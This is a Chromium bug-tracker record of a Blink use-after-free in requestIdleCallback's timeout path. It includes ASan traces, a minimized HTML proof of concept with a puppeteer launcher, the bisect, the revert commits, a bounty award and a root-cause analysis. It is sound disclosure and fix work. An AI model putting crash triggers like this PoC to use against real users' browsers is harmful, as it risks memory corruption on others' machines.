# Security: heap-use-after-free in blink::internal::IdleRequestCallbackWrapper::TimeoutFired

| Field | Value |
|-------|-------|
| **Issue ID** | [339287000](https://issues.chromium.org/issues/339287000) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>DOM |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 126.0.0.0 |
| **Reporter** | zh...@gmail.com |
| **Assignee** | et...@chromium.org |
| **Created** | 2024-05-08 |
| **Bounty** | $8,000.00 |

## Description

# Steps to reproduce the problem

1. For mac and linux systems, download or compile any asan version of chromium after April 16,I use the locally compiled arm mac asan version here, because the downloaded linux asan may lose symbol: `git checkout 22ef2d0e2287f3060397c47b16ce1d466b4549e9`
2. Deploy `poc.html` at `http://127.0.0.1:8000`, and then modify your `browser_binary` path in the `poc.js` file
3. `cd asan-chromium; npm install puppeteer-core ; node poc.js`
4. UAF immediately

# Problem Description

```
=================================================================
==98109==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00006e5e0 at pc 0x00016c5a2144 bp 0x00016b582370 sp 0x00016b582368
READ of size 8 at 0x60d00006e5e0 thread T0
==98109==WARNING: invalid path to external symbolizer!
==98109==WARNING: Failed to use and restart external symbolizer!
    #0 0x16c5a2140 in blink::internal::IdleRequestCallbackWrapper::TimeoutFired(blink::TimerBase*)+0x374 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libblink_core.dylib:arm64+0x101e140)
    #1 0x15c7e4644 in blink::TimerBase::RunInternal()+0xb4 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libblink_platform.dylib:arm64+0x95c644)
    #2 0x16c5a376c in base::internal::Invoker<base::internal::FunctorTraits<void (blink::TimerBase::*&&)(), blink::TimerBase*>, base::internal::BindState<true, true, false, void (blink::TimerBase::*)(), WTF::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x168 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libblink_core.dylib:arm64+0x101f76c)
    #3 0x10723ce48 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x478 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libbase.dylib:arm64+0x224e48)
    #4 0x1072c2098 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0xb14 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libbase.dylib:arm64+0x2aa098)
    #5 0x1072c0de8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x170 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libbase.dylib:arm64+0x2a8de8)
    #6 0x1070c358c in base::MessagePumpDefault::Run(base::MessagePump::Delegate*)+0x2d8 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libbase.dylib:arm64+0xab58c)
    #7 0x1072c3d2c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x514 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libbase.dylib:arm64+0x2abd2c)
    #8 0x10719f270 in base::RunLoop::Run(base::Location const&)+0x51c (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libbase.dylib:arm64+0x187270)
    #9 0x116740c90 in content::RendererMain(content::MainFunctionParams)+0xb88 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libcontent.dylib:arm64+0x3bb8c90)
    #10 0x11696b7f8 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)+0x2b4 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libcontent.dylib:arm64+0x3de37f8)
    #11 0x11696e360 in content::ContentMainRunnerImpl::Run()+0x8f4 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libcontent.dylib:arm64+0x3de6360)
    #12 0x11696938c in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x10c4 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libcontent.dylib:arm64+0x3de138c)
    #13 0x1169699bc in content::ContentMain(content::ContentMainParams)+0x1a0 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libcontent.dylib:arm64+0x3de19bc)
    #14 0x11d857cdc in ChromeMain+0x39c (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libchrome_dll.dylib:arm64+0xbcdc)
    #15 0x10487ce08 in main+0x328 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/126.0.6463.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/Chromium Helper (Renderer):arm64+0x100000e08)
    #16 0x199ece0dc  (<unknown module>)
    #17 0x4237ffffffffffc  (<unknown module>)

0x60d00006e5e0 is located 16 bytes inside of 144-byte region [0x60d00006e5d0,0x60d00006e660)
freed by thread T0 here:
    #0 0x1059a9100 in __asan_memmove+0x2c64 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libclang_rt.asan_osx_dynamic.dylib:arm64+0x51100)
    #1 0x16c59f02c in blink::internal::IdleRequestCallbackWrapper::IdleTaskFired(scoped_refptr<blink::internal::IdleRequestCallbackWrapper>, base::TimeTicks)+0x3bc (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libblink_core.dylib:arm64+0x101b02c)
    #2 0x16c5a4930 in base::internal::Invoker<base::internal::FunctorTraits<void (*&&)(scoped_refptr<blink::internal::IdleRequestCallbackWrapper>, base::TimeTicks), scoped_refptr<blink::internal::IdleRequestCallbackWrapper>&&>, base::internal::BindState<false, true, false, void (*)(scoped_refptr<blink::internal::IdleRequestCallbackWrapper>, base::TimeTicks), scoped_refptr<blink::internal::IdleRequestCallbackWrapper>>, void (base::TimeTicks)>::RunOnce(base::internal::BindStateBase*, base::TimeTicks&&)+0x150 (/Users/zh1x1an1221/xcode-chromium/src/out/asan-0506/libblink_core.dylib:arm64+0x1020930)
    #3 0x15cd51cb4 in blink::scheduler::MainThreadSchedulerImpl::RunIdleTask(base::OnceCallback<void (base::TimeTicks)>, base::TimeTicks)+0x19c (/Users/zh1x1an1221/xcode-chromium/src/out/as

```
# Additional Comments

## Bisect commit

<https://chromiumdash.appspot.com/commit/5365ebe9fa038e5f8d88e7df19e00a759e9415ca>

# Summary

Security: heap-use-after-free in blink::internal::IdleRequestCallbackWrapper::TimeoutFired

# Custom Questions

#### Type of crash:

renderer tab

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A

## Attachments

- [poc.html](attachments/poc.html) (text/html, 485.2 KB)
- [poc.js](attachments/poc.js) (text/javascript, 821 B)
- [asan.txt](attachments/asan.txt) (text/plain, 19.5 KB)
- [poc.mov](attachments/poc.mov) (video/quicktime, 19.4 MB)
- poc.html (text/html, 37.6 KB)
- asan-report.txt (text/plain, 54.2 KB)

## Timeline

### ca...@chromium.org (2024-05-08)

I was not able to reproduce this on Linux in 125.

Could you add a minimized proof of concept? Ideally one that doesn't require using puppeteer and node (though it seems puppeteer is only being used to launch the browser). The current poc is very large and hard to follow.

### zh...@gmail.com (2024-05-09)

> I was not able to reproduce this on Linux in 125.

Of course, you cannot reproduce it in 125 anyway. **I have provided the bisect commit that introduced the vulnerability.**

<https://chromiumdash.appspot.com/commit/5365ebe9fa038e5f8d88e7df19e00a759e9415ca>

The vulnerability was introduced after April 16, and the version must be 126.

I can reproduce it 100% stably in **asan-linux-release-1288393**, which is the code on April 17th.

### pe...@google.com (2024-05-09)

Thank you for providing more feedback. Adding the requester to the CC list.

### zh...@gmail.com (2024-05-09)

> The current poc is very large and hard to follow.

And provide a more streamlined `poc.html`, reduced from the original 3,000 lines to about 5 lines

### zh...@gmail.com (2024-05-09)

And provide a more streamlined `poc.html`, reduced from the original 3,000 lines to about 5 lines

```
➜  linux-release_asan-linux-release-1288393 cat ~/poc.html 
<html>
<head>
<script>
function main() { window.requestIdleCallback(eventhandler2, {timeout: 1}); }
function eventhandler2() { aaa.submit(); }
</script>
</head>
<body onload=main()>
<form id="aaa"></form>
<base target="ccc" ></base>
</body>
</html>

```
```
➜  linux-release_asan-linux-release-1288393 cat poc.js  
const puppeteer = require('puppeteer-core');

async function run(browser_binary) {
    let cur_args = [
        "--no-sandbox",
        "--disable-popup-blocking",
        "--enable-features=ThreadedScrollPreventRenderingStarvation",
        "--user-data-dir=/tmp/nonexist",
        "http://127.0.0.1:8000/poc.html",
        "http://127.0.0.1:8000/poc.html",
    ];
    browser = await puppeteer.launch({
        args: cur_args,
        ignoreDefaultArgs: true,
        devtools: false,
        dumpio: true,
        headless: false,
        executablePath: browser_binary,
        env: {
            ...process.env,
            'ASAN_OPTIONS': 'detect_odr_violation=0',
        }
    });
}

let browser_binary = "./chrome";
(async () => {
    await run(browser_binary);
})();

```
```
➜  linux-release_asan-linux-release-1288393 node poc.js

DevTools listening on ws://127.0.0.1:45531/devtools/browser/ece60589-3040-4cd4-ab28-ae696a86e512
[771403:771403:0509/210705.190813:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is not part of the idle inhibition specification: https://specifications.freedesktop.org/idle-inhibit-spec/latest/
=================================================================
==771489==ERROR: AddressSanitizer: heap-use-after-free on address 0x50d000119f50 at pc 0x651c2ac3911e bp 0x7ffc93759a20 sp 0x7ffc93759a18
READ of size 8 at 0x50d000119f50 thread T0 (chrome)
==771489==WARNING: invalid path to external symbolizer!
==771489==WARNING: Failed to use and restart external symbolizer!
    #0 0x651c2ac3911d  (/home/zh1x1an1221/collection-chromium/linux-release_asan-linux-release-1288393/chrome+0x304fc11d) (BuildId: 8ead77546ef47dec)
    #1 0x651c2a602b4d  (/home/zh1x1an1221/collection-chromium/linux-release_asan-linux-release-1288393/chrome+0x2fec5b4d) (BuildId: 8ead77546ef47dec)
    #2 0x651c26ac3ba4  (/home/zh1x1an1221/collection-chromium/linux-release_asan-linux-release-1288393/chrome+0x2c386ba4) (BuildId: 8ead77546ef47dec)
    #3 0x651c1b207554  (/home/zh1x1an1221/collection-chromium/linux-release_asan-linux-release-1288393/chrome+0x20aca554) (BuildId: 8ead77546ef47dec)
    #4 0x651c1b268dd4  (/home/zh1x1an1221/collection-chromium/linux-release_asan-linux-release-1288393/chrome+0x20b2bdd4) (BuildId: 8ead77546ef47dec)
    #5 0x651c1b267ced  (/home/zh1x1an1221/collection-chromium/linux-release_asan-linux-release-1288393/chrome+0x20b2aced) (BuildId: 8ead77546ef47dec)

```

### cl...@appspot.gserviceaccount.com (2024-05-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6226140214525952.

### ca...@chromium.org (2024-05-09)

Thanks for providing the minimized poc. Looks like ClusterFuzz was not able to reproduce this, and I'm also not able to reproduce (in Linux, on the latest Canary asan) by using the minimized PoC. That said I'm running the PoC directly, running Chrome with the arguments specified in the poc.js.
Reporter: Are you able to trigger the crash without using puppeteer? My read from poc.js is that it's just being used to launch Chrome, but want to double check that the crash does not actually depend on being launched with puppeteer.

### zh...@gmail.com (2024-05-10)

> but want to double check that the crash does not actually depend on being launched with puppeteer.

**The currently provided POC does** require puppeteer to trigger it

I am trying to provide a detailed rca. At present, I am not sure why it can be triggered stably under puppeteer but unstable using chrome.

### pe...@google.com (2024-05-10)

Thank you for providing more feedback. Adding the requester to the CC list.

### ad...@google.com (2024-05-10)

I reproduced this using puppeteer on the second try. Specifically,

1. `apt-get install nodejs npm`
2. `npm install puppeteer-core`
3. Unzip both pocs into the same directory
4. `python3 -m http.server 8000 &`
5. Amend the path to Chrome to an ASAN build within `poc.js`
6. `node poc.js`

I get the exact UaF described.

This was with Chrome version 8ddfc7ef8e5743772985b9e5ea0a03a74e1b41ba.

I haven't bisected to figure out where this was introduced, but the last change to `third_party/blink/renderer/core/dom/scripted_idle_task_controller.cc` was <https://crrev.com/5365ebe9fa038e5f8d88e7df19e00a759e9415ca> which seems to be highly likely to be the place this was introduced, so I'll assign thataway and label appropriately.

I believe this is renderer UaF so labeling as S1.

`poc.js` contains `--enable-features=ThreadedScrollPreventRenderingStarvation` but this doesn't appear to be necessary for the bug to trigger, so not labeling as `Security_Impact-None`.

### ad...@google.com (2024-05-10)

I suspect Sheriffbot/Blintz will label this as an M125 stable blocker, so some urgency may be required of the fix. Labeling as M125 based on when <https://crrev.com/5365ebe9fa038e5f8d88e7df19e00a759e9415ca> landed - many apologies if that's not the regression point but it does seem very likely from the call stacks.

### zh...@gmail.com (2024-05-10)

> I haven't bisected to figure out where this was introduced, but the last change to third\_party/blink/renderer/core/dom/scripted\_idle\_task\_controller.cc was <https://crrev.com/5365ebe9fa038e5f8d88e7df19e00a759e9415ca> which seems to be highly likely to be the place this was introduced, so I'll assign thataway and label appropriately.

See [#comment3](https://issues.chromium.org/issues/339287000#comment3) ,regarding bisect, I have already done it on Linux. I am very sure that it was introduced by [this](https://chromiumdash.appspot.com/commit/5365ebe9fa038e5f8d88e7df19e00a759e9415ca) commit.

### zh...@gmail.com (2024-05-10)

To be more specific:

1. Download `linux-release_asan-linux-release-1287510`. The vulnerability **cannot** be reproduced.
2. Download `linux-release_asan-linux-release-1287514`. The vulnerability **can** be reproduced

### ad...@google.com (2024-05-10)

Ah sorry I didn't spot that. Yeah it looks like we hit upon the same commit anyway!

### et...@google.com (2024-05-10)

Reverting here: <https://chromium-review.googlesource.com/c/chromium/src/+/5530772>

### pe...@google.com (2024-05-10)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-05-10)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ap...@google.com (2024-05-10)

Project: chromium/src
Branch: main

commit d6f502d1c8e1c1a14dd0c5785bc3f2480341c6b5
Author: Etienne Pierre-Doray <etiennep@chromium.org>
Date:   Fri May 10 17:11:18 2024

    Revert "[tasks] Make idle request timeout cancelable"
    
    This reverts commit 5365ebe9fa038e5f8d88e7df19e00a759e9415ca.
    
    Reason for revert: Suspected UAF
    b/339287000
    
    Original change's description:
    > [tasks] Make idle request timeout cancelable
    >
    > Using a timer makes tasks cancelable, which should reduce
    > OOM related to delayed tasks queue.
    >
    > Change-Id: I6ba4b7101f2ff694303a366d7f1d4b882a668da9
    > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5449850
    > Reviewed-by: Scott Haseley <shaseley@chromium.org>
    > Commit-Queue: Etienne Pierre-Doray <etiennep@chromium.org>
    > Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
    > Reviewed-by: Mason Freed <masonf@chromium.org>
    > Cr-Commit-Position: refs/heads/main@{#1287514}
    
    Bug: 339287000
    Change-Id: I942f7e500542abfed4d39a223d283d15951f36af
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5530772
    Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
    Commit-Queue: Etienne Pierre-Doray <etiennep@chromium.org>
    Reviewed-by: Mason Freed <masonf@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1299333}

M       third_party/blink/renderer/core/dom/scripted_idle_task_controller.cc

https://chromium-review.googlesource.com/5530772


### pe...@google.com (2024-05-13)

Merge review required: M125 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

### et...@google.com (2024-05-13)

1. Why does your merge fit within the merge criteria for these milestones?
   Important (S1) security issue
2. What changes specifically would you like to merge? Please link to Gerrit.
   <https://chromium-review.googlesource.com/c/chromium/src/+/5530772>
3. Have the changes been released and tested on canary?
   Yes
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
   No
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
   Mo
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.
   Yes, described in [Comment #11](https://issues.chromium.org/issues/339287000#comment11)

### am...@chromium.org (2024-05-14)

I'm going to close this as fixed; in the future, please update security issues as fixed as soon as the fix is landed. This will allow the bot to update with appropriate merge request tags sooner. This is in the merge queue, but will need to be reviewed for approval tomorrow at the earliest. M125 Stable RC is being cut at the moment for release tomorrow, so we will revisit for review and approval following that.

### am...@chromium.org (2024-05-16)

Updating to SI-Beta, because while as of today M125 is Stable, at the time this issue was reported, M125 was beta
Will file a bug against the bot to investigate why the bot updated this issue as SI-Stable on 10 May

### am...@chromium.org (2024-05-16)

Since this change introduced the UAF, please ensure this revert is applied to M125, branch 6422 at soonest.

### et...@google.com (2024-05-16)

I created the CP here: <https://chromium-review.googlesource.com/c/chromium/src/+/5545678>

### ap...@google.com (2024-05-17)

Project: chromium/src
Branch: refs/branch-heads/6422

commit 9d10e3ebed140658b03bd935a4ea9cc24e04421e
Author: Etienne Pierre-Doray <etiennep@chromium.org>
Date:   Fri May 17 19:04:18 2024

    [merge M125] Revert "[tasks] Make idle request timeout cancelable"
    
    This reverts commit 5365ebe9fa038e5f8d88e7df19e00a759e9415ca.
    
    Reason for revert: Suspected UAF
    b/339287000
    
    Original change's description:
    > [tasks] Make idle request timeout cancelable
    >
    > Using a timer makes tasks cancelable, which should reduce
    > OOM related to delayed tasks queue.
    >
    > Change-Id: I6ba4b7101f2ff694303a366d7f1d4b882a668da9
    > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5449850
    > Reviewed-by: Scott Haseley <shaseley@chromium.org>
    > Commit-Queue: Etienne Pierre-Doray <etiennep@chromium.org>
    > Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
    > Reviewed-by: Mason Freed <masonf@chromium.org>
    > Cr-Commit-Position: refs/heads/main@{#1287514}
    
    (cherry picked from commit d6f502d1c8e1c1a14dd0c5785bc3f2480341c6b5)
    
    Bug: 339287000
    Change-Id: I942f7e500542abfed4d39a223d283d15951f36af
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5530772
    Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
    Commit-Queue: Etienne Pierre-Doray <etiennep@chromium.org>
    Reviewed-by: Mason Freed <masonf@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1299333}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5545678
    Cr-Commit-Position: refs/branch-heads/6422@{#1052}
    Cr-Branched-From: 9012208d0ce02e0cf0adb9b62558627c356f3278-refs/heads/main@{#1287751}

M       third_party/blink/renderer/core/dom/scripted_idle_task_controller.cc

https://chromium-review.googlesource.com/5545678


### pe...@google.com (2024-05-17)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



### rz...@google.com (2024-05-21)

Adding to the LTS-NotApplicable-120 hotlist because the reverted CL isnt in 120 branch.

### pe...@google.com (2024-05-21)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



### sp...@google.com (2024-05-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
$7,000 for report of memory corruption in a sandboxed process + $1,000 bisect bonus

Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. Two other things we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.
* If you are not already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have already registered, there is no need to repeat the process and you’ll automatically be paid soon. If you have any payment related questions or issues, please reach out to p2p-vrp@google.com.

### am...@chromium.org (2024-05-22)

Thank you for your efforts and reporting this issue to us, zh1x1an1221!

### zh...@gmail.com (2024-05-23)

Thank you very much amy, cheers 🍻

### pe...@google.com (2024-06-17)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### ma...@brave.com (2024-07-09)

I tested there steps in [crrev.com/c/5670619](https://crrev.com/c/5670619) to be sure we don't get this UaF again.
However, I've found that it can't be reproduced without puppeteer.

Here is why we had this UaF: the callback in requestIdleCallback submits the form, it creates a nested RunLoop in `WebDevToolsAgentImpl` (when puppeteer is attached), and `IdleRequestCallbackWrapper` became deleted in the middle of the `TimeoutFired()`.
I suppose there is no way to make a nested RunLoop in production.

```
void TimeoutFired(TimerBase*) {
    if (ScriptedIdleTaskController* controller = Controller()) {
      controller->CallbackFired(Id(), base::TimeTicks::Now(),
                                IdleDeadline::CallbackType::kCalledByTimeout);
      // ^^ a nested runLoop is created in WebDevToolsAgentImpl::WaitForDebugger(),
      // IdleTaskFired() is called, deleting `this`.
    }
    // UaF is here:
    Cancel();
}

```

a [link](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/dom/scripted_idle_task_controller.cc;l=58-64;drc=5365ebe9fa038e5f8d88e7df19e00a759e9415ca;bpv=0;bpt=0) the "vulnerable" `scripted_idle_task_controller.cc` revision:

The full report is in the attachment (note: the reports from 2 processes are mixed here).

### pe...@google.com (2024-08-21)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/339287000)*
